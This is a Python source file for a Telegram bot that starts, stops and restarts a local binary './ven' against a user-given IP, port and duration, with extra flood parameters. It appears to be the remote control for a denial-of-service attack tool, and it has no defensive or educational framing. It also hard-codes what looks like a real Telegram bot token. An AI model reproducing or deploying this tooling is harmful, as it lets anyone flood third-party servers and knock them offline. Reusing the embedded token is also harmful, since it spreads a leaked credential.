import telebot
import subprocess
import threading
import time
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton

# ✅ Your Bot Token
TOKEN = "7891086959:AAHRxmmQ5xao6odeiTR1KiGShUAiX1Aydw0"
bot = telebot.TeleBot(TOKEN)

attack_process = None
last_attack = None  # Stores (ip, port, time)

def get_keyboard():
    markup = InlineKeyboardMarkup()
    markup.row_width = 2
    markup.add(
        InlineKeyboardButton("▶️ Start", callback_data="start_attack"),
        InlineKeyboardButton("⛔ Stop", callback_data="stop_attack")
    )
    return markup

@bot.message_handler(commands=['attack'])
def attack(message):
    global attack_process, last_attack

    args = message.text.split()
    if len(args) != 4:
        bot.reply_to(message, "Usage: /attack <ip> <port> <time>")
        return

    ip, port, duration = args[1], args[2], args[3]

    if not port.isdigit() or not duration.isdigit():
        bot.reply_to(message, "❌ Port and time must be numbers.")
        return

    if attack_process and attack_process.poll() is None:
        bot.send_message(message.chat.id, "⚠️ Attack already running. Use Stop first.", reply_markup=get_keyboard())
        return

    try:
        last_attack = (ip, port, duration)
        cmd = ["./ven", ip, port, duration, "500", "1024", "64"]
        attack_process = subprocess.Popen(cmd)
        bot.send_message(
            message.chat.id,
            f"✅ Attack started:\n`./ven {ip} {port} {duration} 500 1024 64`",
            parse_mode="Markdown",
            reply_markup=get_keyboard()
        )
    except Exception as e:
        bot.reply_to(message, f"❌ Failed to start attack: {str(e)}")

@bot.message_handler(commands=['stop'])
def stop_attack_cmd(message):
    stop_attack(message.chat.id)

@bot.message_handler(commands=['start'])
def restart_attack_cmd(message):
    start_attack(message.chat.id)

@bot.callback_query_handler(func=lambda call: True)
def handle_callback(call):
    if call.data == "start_attack":
        start_attack(call.message.chat.id)
    elif call.data == "stop_attack":
        stop_attack(call.message.chat.id)
    bot.answer_callback_query(call.id)

def start_attack(chat_id):
    global attack_process, last_attack
    if last_attack:
        ip, port, duration = last_attack
        if attack_process and attack_process.poll() is None:
            bot.send_message(chat_id, "⚠️ Attack already running.", reply_markup=get_keyboard())
            return
        try:
            cmd = ["./ven", ip, port, duration, "500", "1024", "64"]
            attack_process = subprocess.Popen(cmd)
            bot.send_message(chat_id, f"🔁 Restarted:\n`./ven {ip} {port} {duration} 500 1024 64`", parse_mode="Markdown", reply_markup=get_keyboard())
        except Exception as e:
            bot.send_message(chat_id, f"❌ Failed to restart: {str(e)}")
    else:
        bot.send_message(chat_id, "ℹ️ No previous attack found. Use /attack first.")

def stop_attack(chat_id):
    global attack_process
    if attack_process and attack_process.poll() is None:
        attack_process.terminate()
        attack_process = None
        bot.send_message(chat_id, "🛑 Attack stopped.", reply_markup=get_keyboard())
    else:
        bot.send_message(chat_id, "ℹ️ No running attack to stop.")

@bot.message_handler(func=lambda m: True)
def echo(message):
    bot.send_message(message.chat.id, f"You said: {message.text}")

# Print "24/7" in background
def print_247():
    while True:
        print("24/7")
        time.sleep(1)

threading.Thread(target=print_247, daemon=True).start()

bot.infinity_polling()
